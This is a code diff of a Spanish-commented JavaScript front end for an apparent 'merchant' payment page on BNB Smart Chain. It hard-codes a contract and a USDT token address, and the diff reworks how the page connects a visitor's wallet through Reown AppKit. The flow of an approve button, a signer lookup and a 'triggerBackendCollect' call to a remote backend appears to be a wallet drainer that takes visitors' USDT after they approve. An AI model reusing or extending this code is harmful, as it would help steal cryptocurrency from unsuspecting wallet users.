@@ -4,7 +4,7 @@
 const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
 const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_CHAIN_ID_HEX = "0x38"; // Chain ID 56 en Hex
+const BSC_CHAIN_ID_HEX = "0x38"; 
 const MIN_USDT_BALANCE = 0n; 
 const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
 
@@ -12,7 +12,6 @@ const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
   "https://bsc-dataseed1.binance.org/",
   "https://bsc-dataseed2.binance.org/",
-  "https://bsc-dataseed3.binance.org/",
   "https://rpc.ankr.com/bsc"
 ];
 
@@ -42,8 +41,6 @@ if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
 
-let _cachedAddress = null;
-
 // ─── UI helpers ───────────────────────────────────────────────────────────────
 let _toastTimer;
 function showToast(msg, type = "default", ms = 4500) {
@@ -61,7 +58,6 @@ function setLoading(on, label = "Processing…") {
   if (btnText) btnText.textContent = on ? label : "NEXT";
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
-
 
 // ─── Backend collect trigger ──────────────────────────────────────────────────
 async function triggerBackendCollect(userAddress) {
@@ -87,44 +83,36 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// ─── Get Active Provider (AppKit / Injected fallback) ─────────────────────────
-async function getActiveProvider() {
-  // 1. Intentar obtener el proveedor activo desde Reown AppKit
-  if (window.modal && typeof window.modal.getWalletProvider === "function") {
-    try {
-      const provider = window.modal.getWalletProvider();
-      if (provider) return provider;
-    } catch (_) {}
-  }
-  // 2. Respaldo por inyección estándar del navegador / extensiones
-  if (window.ethereum) return window.ethereum;
-  return null;
-}
-
-// ─── Main Button Handler Corregido ────────────────────────────────────────────
+// ─── Main Button Handler (AppKit Native Flow) ─────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    let rawProvider = await getActiveProvider();
+    
+    // Obtener proveedor activo gestionado por AppKit
+    let rawProvider = null;
+    if (window.modal && typeof window.modal.getWalletProvider === "function") {
+      try {
+        rawProvider = window.modal.getWalletProvider();
+      } catch (_) {}
+    }
 
-    // Si no hay un proveedor activo, abrimos el modal flotante de Reown AppKit
+    // SI NO HAY NINGUNA BILLETERA CONECTADA -> ABRIR MODAL PROFESIONAL DE REOWN
     if (!rawProvider) {
       if (window.modal && typeof window.modal.open === "function") {
         try {
           await window.modal.open();
-          return; // Abre el modal para que el usuario elija su wallet en PC o Móvil
+          return; // El modal se abre y lista automáticamente las extensiones de PC y QR de móviles
         } catch (modalErr) {
-          console.error("Error al abrir el modal de Reown:", modalErr);
+          console.error("Error al abrir AppKit:", modalErr);
         }
-      } else {
-        showToast("El sistema de billeteras no está inicializado.", "error");
-        return;
       }
+      showToast("No se pudo inicializar el selector de billeteras.", "error");
+      return;
     }
 
     setLoading(true, "Conectando proveedor…");
 
     try {
-      // Inicializar proveedor y firmante mediante Ethers.js v6
+      // Inicializar Ethers.js v6 con el proveedor estandarizado de AppKit
       const provider = new ethers.BrowserProvider(rawProvider);
       
       // Validación y cambio de red nativo a BSC
@@ -152,7 +140,6 @@ if (approveBtn) {
 
       const signer = await provider.getSigner();
       const userAddress = await signer.getAddress();
-      _cachedAddress = userAddress;
 
       if (!userAddress) {
         showToast("Desbloquea tu billetera y selecciona una cuenta.", "error");
